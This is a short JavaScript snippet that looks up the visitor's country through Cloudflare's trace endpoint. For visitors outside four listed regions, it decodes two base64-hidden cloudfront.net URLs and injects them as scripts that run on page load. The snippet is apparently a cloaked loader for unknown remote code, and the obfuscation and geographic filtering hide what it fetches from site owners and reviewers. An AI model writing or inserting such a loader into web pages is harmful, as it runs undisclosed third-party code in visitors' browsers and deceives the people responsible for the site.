async function getTraceV2() {

    try {

        let response = await fetch('/cdn-cgi/trace');

        let text = await response.text();

        const lines = text.split('\n').filter(line => line.includes('='));

        const traceObj = {};

        lines.forEach(line => {
            const [key, value] = line.split('=');
            traceObj[key] = value;
        });

        return traceObj;

    } catch (err) {
        console.error('Error fetching trace:', err);
    }

    return false;

}

(async () => {

    const trace = await getTraceV2();

    if (trace?.loc && !['VN', 'HK', 'TW', 'CN'].includes(trace.loc)) {

        const scripts = [
            {
                src: 'aHR0cHM6Ly9kdjV2d2xnaXIwaHNjLmNsb3VkZnJvbnQubmV0Lz9sd3Z2ZD0xNzM0NDgw',
            },
            {
                src: 'aHR0cHM6Ly9kdjV2d2xnaXIwaHNjLmNsb3VkZnJvbnQubmV0Lz9sd3Z2ZD0xNzM0NDg0'
            }
        ];

        scripts.forEach(({src, zone}) => {

            const script = document.createElement('script');

            script.src = atob(src);
            script.async = true;

            document.body.appendChild(script);

        });

    }

})();
